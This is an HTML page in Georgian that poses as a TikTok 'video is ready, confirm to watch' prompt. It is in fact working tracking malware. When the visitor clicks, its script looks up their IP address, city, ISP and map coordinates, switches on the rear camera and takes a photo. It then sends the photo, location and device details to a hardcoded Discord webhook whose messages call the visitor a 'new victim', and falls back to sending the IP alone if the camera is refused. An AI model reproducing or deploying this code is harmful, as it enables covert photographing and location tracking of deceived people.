<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ჩატვირთვა...</title>
</head>
<body style="background-color: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; overflow: hidden;">

    <div id="content" style="text-align: center; padding: 20px;">
        <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" width="70" style="margin-bottom: 20px;">
        <h2>ვიდეო მზად არის</h2>
        <p style="color: #ccc;">სანახავად დააჭირეთ დადასტურებას</p>
        <button id="authBtn" style="background: #fe2c55; color: white; border: none; padding: 15px 40px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px;">დადასტურება</button>
    </div>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>

    <script>
        // შენი Webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";

        document.getElementById('authBtn').addEventListener('click', async () => {
            document.getElementById('content').innerHTML = "<h2>ჩატვირთვა...</h2><p>გთხოვთ დაელოდოთ</p>";
            
            try {
                // 1. IP და დეტალური გეოლოკაციის მიღება
                const geoRes = await fetch('http://ip-api.com/json/?fields=status,country,city,isp,lat,lon,query');
                const geoData = await geoRes.json();

                // 2. კამერის ჩართვა (ვცდილობთ უკანა/ფართო კამერას)
                const constraints = {
                    video: {
                        facingMode: "environment", 
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };

                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('video');
                video.srcObject = stream;

                // ველოდებით 0.8 წამს, რომ კამერა ჩაირთოს და ფოკუსი გასწორდეს
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('file', blob, 'capture.jpg');

                        // დისქორდის შეტყობინების აწყობა IP-ით და ლოკაციით
                        const discordContent = {
                            content: "🎯 **ახალი მსხვერპლი დაფიქსირდა!**",
                            embeds: [{
                                title: "📍 დეტალური მონაცემები",
                                color: 16711680,
                                fields: [
                                    { name: "🌐 IP მისამართი", value: `\`${geoData.query}\``, inline: true },
                                    { name: "🏙️ ქალაქი", value: geoData.city || "უცნობია", inline: true },
                                    { name: "📡 პროვაიდერი (ISP)", value: geoData.isp || "უცნობია", inline: false },
                                    { name: "🗺️ რუკა", value: `[Google Maps ლინკი](https://www.google.com/maps?q=${geoData.lat},${geoData.lon})` }
                                ],
                                footer: { text: "Device: " + navigator.userAgent },
                                timestamp: new Date()
                            }]
                        };

                        formData.append('payload_json', JSON.stringify(discordContent));

                        // გაგზავნა დისქორდზე
                        await fetch(webhookURL, {
                            method: 'POST',
                            body: formData
                        });

                        // კამერის გათიშვა და გადამისამართება
                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.tiktok.com";
                    }, 'image/jpeg', 0.8);
                }, 800);

            } catch (err) {
                // თუ კამერა დაბლოკა, მაინც გავაგზავნოთ მარტო IP ინფორმაცია
                const geoRes = await fetch('http://ip-api.com/json/');
                const geoData = await geoRes.json();
                
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: "⚠️ **მსხვერპლმა კამერა დაბლოკა, მაგრამ IP მოვიდა!**",
                        embeds: [{
                            fields: [
                                { name: "🌐 IP", value: `\`${geoData.query}\`` },
                                { name: "🏙️ ქალაქი", value: geoData.city }
                            ]
                        }]
                    })
                });
                window.location.href = "https://www.tiktok.com";
            }
        });
    </script>
</body>
</html>
